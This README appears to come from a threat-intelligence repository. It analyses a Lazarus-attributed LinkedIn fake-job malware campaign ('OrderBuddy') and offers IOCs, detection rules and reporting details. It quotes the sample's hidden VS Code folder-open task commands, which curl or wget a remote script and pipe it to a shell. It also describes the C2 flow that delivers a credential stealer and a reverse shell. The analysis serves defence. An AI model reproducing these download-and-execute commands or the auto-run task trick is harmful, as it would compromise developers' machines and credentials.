# Operation Dream Job — OrderBuddy Campaign Analysis

> Full-spectrum incident response, reverse engineering, and forensic analysis of a **Lazarus Group (DPRK)** LinkedIn malware campaign targeting software developers.

[![TLP:CLEAR](https://img.shields.io/badge/TLP-CLEAR-white)](https://www.first.org/tlp/)
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT%26CK-v14-red)](mitre-attack/MAPPING.md)
[![IOCs](https://img.shields.io/badge/IOCs-STIX%202.1-blue)](iocs/)
[![YARA](https://img.shields.io/badge/YARA-7%20rules-green)](yara/)
[![Sigma](https://img.shields.io/badge/Sigma-3%20rules-orange)](sigma/)

---

## TL;DR

A colleague received a **fake coding assignment** ("OrderBuddy") via LinkedIn from a fabricated recruiter profile.  
The ZIP archive contained **4 independent attack vectors** with 5-layer obfuscation, a triple-C2 fallback chain, and cross-platform payloads for Windows, macOS, and Linux.

**No system was compromised.** The malware was fully reverse-engineered in an isolated Docker sandbox — first statically (Phase 1–2), then dynamically with live C2 contact (Phase 3).

The campaign was reported to **BSI/CERT-Bund**, **CSBW**, and **LKA**, who confirmed attribution to **Lazarus Group / "Operation Dream Job"**.

---

## Key Findings

| Finding | Detail |
|---------|--------|
| **Attribution** | Lazarus Group (DPRK) — confirmed by BSI, LKA, CSBW |
| **Delivery** | LinkedIn spearphishing → ZIP archive as "coding assignment" |
| **Attack Vectors** | 4 independent vectors (tasks.json auto-exec, webpack build-time, settings.json, .env credential harvesting) |
| **Obfuscation** | 5-layer: String-Array-Rotation (60 shifts), XOR, Base64, Base85, zlib |
| **C2 Infrastructure** | Triple fallback: `147.124.202.225` → `38.92.47.157` → `66.235.175.117` (all AS397423 / Tier.Net) |
| **Payloads** | Browser credential stealer (JS), file exfiltrator (JS), SSH/FTP RAT (JS), Python reverse shell |
| **Exfiltration** | HTTP POST, FTP (pyftpdlib), SSH — multi-channel |
| **Persistence** | `setInterval` 615,968 ms (~10.3 min), hidden in `~/.vscode/` |
| **Social Engineering** | 2 fake websites (Azure, Hostinger), LinkedIn company page, DigiCert SSL |
| **C2 Status** | **Active and serving payloads** at time of dynamic analysis (2026-02-28) |

---

## Repository Structure

```
operation-dream-job/
├── docs/
│   ├── FORENSIC_REPORT.md           # Full forensic report (Phase 1–3 combined, EN)
│   ├── DYNAMIC_ANALYSIS.md          # Phase 3 dynamic analysis with live C2
│   └── TIMELINE.md                  # Minute-by-minute forensic timeline
├── iocs/
│   ├── network-iocs.csv             # IPs, domains, URLs — SIEM-ready
│   ├── file-iocs.csv                # SHA256, MD5, filenames
│   ├── c2-endpoints.csv             # C2 endpoint enumeration
│   ├── stix2-bundle.json            # STIX 2.1 bundle (machine-readable)
│   └── README.md                    # IOC format guide
├── yara/
│   ├── orderbuddy_campaign.yar      # 7 campaign-specific rules (verified)
│   └── generic_linkedin_malware.yar # Generic detection for similar campaigns
├── sigma/
│   ├── orderbuddy_c2_beacon.yml     # C2 beacon detection
│   ├── orderbuddy_vscode_persist.yml# .vscode persistence detection
│   └── orderbuddy_npm_abuse.yml     # Malicious npm lifecycle hooks
├── suricata/
│   └── orderbuddy_c2.rules          # Network IDS rules
├── mitre-attack/
│   ├── MAPPING.md                   # Full ATT&CK mapping with evidence
│   └── navigator-layer.json         # ATT&CK Navigator import layer
├── scripts/
│   └── check-infection.sh           # 17-point IR check script (read-only, macOS/Linux)
└── sandbox/
    └── docker-compose.yml           # Isolated analysis environment
```

---

## Kill Chain

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  RECONNAISSANCE │     │  WEAPONIZATION  │     │    DELIVERY     │
│                 │     │                 │     │                 │
│ LinkedIn target │────>│ ZIP with 4      │────>│ LinkedIn DM     │
│ profiling       │     │ attack vectors  │     │ "Coding task"   │
│                 │     │ 5-layer obfusc. │     │                 │
└─────────────────┘     └─────────────────┘     └────────┬────────┘
                                                         │
┌─────────────────┐     ┌─────────────────┐     ┌────────v────────┐
│   ACTIONS ON    │     │  COMMAND AND    │     │  EXPLOITATION   │
│   OBJECTIVES    │     │  CONTROL        │     │                 │
│                 │     │                 │     │ npm run build   │
│ Credential      │<────│ 3-tier fallback │<────│ OR folder open  │
│ theft, RAT,     │     │ HTTP/FTP/SSH    │     │ (auto-exec)     │
│ file exfil      │     │ Port 1244       │     │                 │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

---

## C2 Communication Flow

```
Malware (webpack)
    │
    ├──GET /s/40abc1fa2901──> 147.124.202.225:1244  ❌ RST (offline)
    │
    ├──GET /s/40abc1fa2901──> 38.92.47.157:1244     ✅ Base64 config
    │                           │
    │                           └── Decoded: 66.235.175.117,ryGnMe8
    │
    ├──POST /keys────────────> 66.235.175.117:1244  📤 System recon exfil
    ├──GET  /j/ryGnMe8───────> 66.235.175.117:1244  📥 test.js (credential stealer)
    ├──GET  /z/ryGnMe8───────> 66.235.175.117:1244  📥 p.js (file exfiltrator)
    ├──GET  /o/ryGnMe8───────> 66.235.175.117:1244  📥 njs (SSH/FTP RAT)
    ├──GET  /cli/ryGnMe8─────> 66.235.175.117:1244  📥 main.py (reverse shell)
    └──POST /uploads─────────> 66.235.175.117:1244  📤 Browser creds, files
```

---

## Attack Vectors

### Vector 1: `.vscode/tasks.json` — Auto-Execution (CRITICAL)

Triggers automatically when opening the project folder in VS Code or Cursor. No user interaction required beyond opening the folder.

```json
"runOptions": { "runOn": "folderOpen" }
"presentation": { "reveal": "never", "echo": false }
```

Commands hidden behind **208 whitespace characters**, targeting all platforms:

| OS | Payload |
|----|---------|
| macOS | `curl 'https://gurucooldown.short.gy/ryGnMe8m' -L \| sh` |
| Linux | `wget -qO- 'https://gurucooldown.short.gy/ryGnMe8l' -L \| sh` |
| Windows | `curl https://gurucooldown.short.gy/ryGnMe8w -L \| cmd` |

### Vector 2: `webpack.config.js` — Build-Time Infostealer (CRITICAL)

Executes during `npm run build`, `npm start`, or `npm run dev`. Contains the main C2 beacon and payload downloader with 5-layer obfuscation:

| Layer | Technique |
|-------|-----------|
| 1 | String-Array-Rotation (109 fragments, 60 shifts, checksum 0x92692) |
| 2 | Lookup aliasing (`as = at = au = av = aw = a1`) |
| 3 | `c()` decoder: `slice(1)` → Base64 → UTF-8 |
| 4 | XOR encryption (key: `0x70 0xA0 0x89 0x48`) |
| 5 | Anti-debug: recursive `toString()` console trap |

### Vector 3: `settings.json` — Hidden Command Injection

Disables `wordWrap`, `minimap`, and `formatOnSave` to hide malicious commands placed after 200+ whitespace characters.

### Vector 4: `.env.example` — Credential Harvesting

Contains real MongoDB credentials (`mongodb+srv://ananth:***@watercooler`) designed to lure developers into connecting to attacker-controlled infrastructure.

---

## Social Engineering Infrastructure

Two professional fake websites were maintained as cover for the campaign — neither contains malware:

| Domain | Hosting | Tech Stack | Purpose |
|--------|---------|------------|---------|
| `orderbuddyapp.com` | Azure CDN (13.107.213.45) | React SPA (Vite) | Fake product page |
| `orderbuddyshop.com` | Hostinger BR (82.25.73.196) | Next.js SSR | Fake marketing site |
| `linkedin.com/company/orderbuddyshop` | LinkedIn | — | Fake company page |

Both sites feature professional design, SEO optimization, SSL certificates, and custom email addresses.

---

## How to Use This Repository

### For SOC / IR Teams

1. Import `iocs/network-iocs.csv` and `iocs/file-iocs.csv` into your SIEM
2. Deploy `yara/orderbuddy_campaign.yar` to your endpoint detection
3. Add `suricata/orderbuddy_c2.rules` to your network IDS
4. Run `scripts/check-infection.sh` on potentially affected developer workstations

### For Threat Intelligence

1. Import `iocs/stix2-bundle.json` into your TIP (MISP, OpenCTI, etc.)
2. Review `mitre-attack/MAPPING.md` for the full ATT&CK mapping
3. Import `mitre-attack/navigator-layer.json` into [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)

### For Developer Awareness

1. Read the [Forensic Report](docs/FORENSIC_REPORT.md) to understand how the attack works
2. Set `"task.allowAutomaticTasks": "never"` in your VS Code / Cursor settings
3. **Never run `npm install` on untrusted code** without reviewing `package.json` and all lifecycle hooks
4. Be suspicious of unsolicited "coding assignments" via LinkedIn

---

## Quick IOC Check

Block these immediately in your firewall / SIEM:

```
# C2 IPs (AS397423 — Tier.Net Technologies LLC)
66.235.175.117    # Active C2 (Express.js :1244, FTP :21, SSH :22)
38.92.47.157      # Fallback C2 (config server)
147.124.202.225   # Primary C2 (offline at time of analysis)
4.202.147.122     # Alternative C2 (Azure, statically identified)

# Domains
gurucooldown.short.gy       # Stage 1 shell downloader
alanservice.vercel.app      # Payload redirect
orderbuddyapp.com           # Fake product site (Azure)
orderbuddyshop.com          # Fake marketing site (Hostinger)

# URLs
jsonkeeper.com/b/QWY20      # eval() payload host

# File Hashes (SHA256)
2ac11f7302ea0e35e7626fb2bc4f4b68c047313c0fc5cc5681a850cf1b164047  # Original ZIP
d273e7fc22daa42d8cb20b833c52c0cddca1a967891c9bab4573d3a6a4b925d7  # test.js (stealer)
4b154b8e35e4cbb3f9851b503b8245bfec601b00330690ef3d2a66bf42c4077b  # p.js (exfil)
8efb64fb702476ff55e6ebf5be38ec0b53eec0d9e456695099a149c8810dac7d  # njs (RAT)
7ddff976b79ef4010a2d1e14938bbd33b3749febe39c8757df987d8cf54acd3c  # main.py (revshell)

# LinkedIn
linkedin.com/in/kendall-mareth-lopez-diaz-3a5437365  # Fake recruiter
```

---

## Existing IR Tooling

For immediate incident response and C2 sinkholing, see the companion repository:

**[Leviticus-Triage/ir-sinkhole](https://github.com/Leviticus-Triage/ir-sinkhole)**

---

## Methodology

| Phase | Scope | Duration | Key Tools |
|-------|-------|----------|-----------|
| Phase 1 — Static Analysis | File structure, YARA, pattern scanning | 2026-02-19 | Docker sandbox (network: none), custom scripts |
| Phase 2 — Reverse Engineering | Full deobfuscation of all 4 vectors | 2026-02-19 | Custom deobfuscator, AST analysis, manual RE |
| Phase 3 — Dynamic Analysis | Live C2 contact in isolated container | 2026-02-27/28 | tshark, asciinema, inotifywait, HexStrike, Nmap |

All analysis was performed in **isolated Docker containers** with appropriate security controls. The host system was verified clean after each phase.

---

## Reporting

This campaign has been reported to:

- **BSI / CERT-Bund** — Federal Office for Information Security (Germany)
- **CSBW** — Cybersicherheitsagentur Baden-Württemberg
- **LKA** — Landeskriminalamt (State Criminal Police)
- **Tier.Net** — C2 hosting provider (abuse report)
- **Vercel** — Payload redirect hosting
- **LinkedIn** — Fake recruiter profile
- **Microsoft Azure** — Fake website hosting
- **Hostinger** — Fake website hosting

---

## References

- [Mandiant: DPRK Threat Actors Target Tech via Fake Job Listings](https://www.mandiant.com/resources/blog/dprk-threat-actors-target-tech)
- [Microsoft: Lazarus targets engineers with weaponized projects](https://www.microsoft.com/en-us/security/blog/2023/12/07/star-blizzard-increases-sophistication-and-evasion/)
- [CISA Advisory: North Korean State-Sponsored Cyber Actors](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-108a)

---

## Author

**Leviticus-Triage**  
Cybersecurity Analyst | Incident Response | Reverse Engineering

---

## License

This research is published under [TLP:CLEAR](https://www.first.org/tlp/) for the benefit of the security community.  
Detection rules and scripts are released under the [MIT License](LICENSE).

*If you or your organization has been targeted by this campaign, please open an issue or reach out directly.*
